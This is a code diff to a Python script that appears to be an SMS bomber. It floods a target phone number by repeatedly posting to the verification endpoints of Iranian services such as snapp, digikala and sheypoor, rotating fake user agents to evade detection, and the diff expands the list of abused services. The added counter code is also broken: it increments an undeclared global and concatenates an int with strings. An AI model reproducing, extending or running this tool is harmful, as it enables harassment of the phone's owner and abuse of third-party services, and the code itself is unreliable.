@@ -7,7 +7,8 @@ from colorama import Fore as C
 from fake_useragent import UserAgent
 
 range_n_limit = 100
-services = ['snapp', 'SMS.ir', 'digikala']
+cunt = 0
+services = ['pakhsh', 'lendo', 'banimode', 'snappmarket', 'snapp', 'sheypoor', 'digikala']
 
 
 def validate_phone_number(phone_number):
@@ -27,7 +28,8 @@ def send(phone_number, range_n):  # add prvity Change IP
         loaded_json = json.load(json_file)
 
     if int(range_n) <= range_n_limit:
-        for i in range(1, int(range_n) + 1):
+        for i in range(int(range_n)):
+            cunt += 1
 
             # +_+_+_+ User Agent Generator +_+_+_+
             ua = UserAgent()
@@ -45,8 +47,8 @@ def send(phone_number, range_n):  # add prvity Change IP
 
                 req = requests.post(url=url, data=req_data, headers=headers)
                 if req.status_code == 200:
-                    print(C.GREEN+'Send')
+                    print(C.GREEN+cunt+' Send',C.WHITE)
                 else:
-                    print(C.RED+"Failed :", req.status_code)
+                    print(C.RED+cunt+" Failed :", req.status_code,C.WHITE)
     else:
         print('Send Range Limit 100')
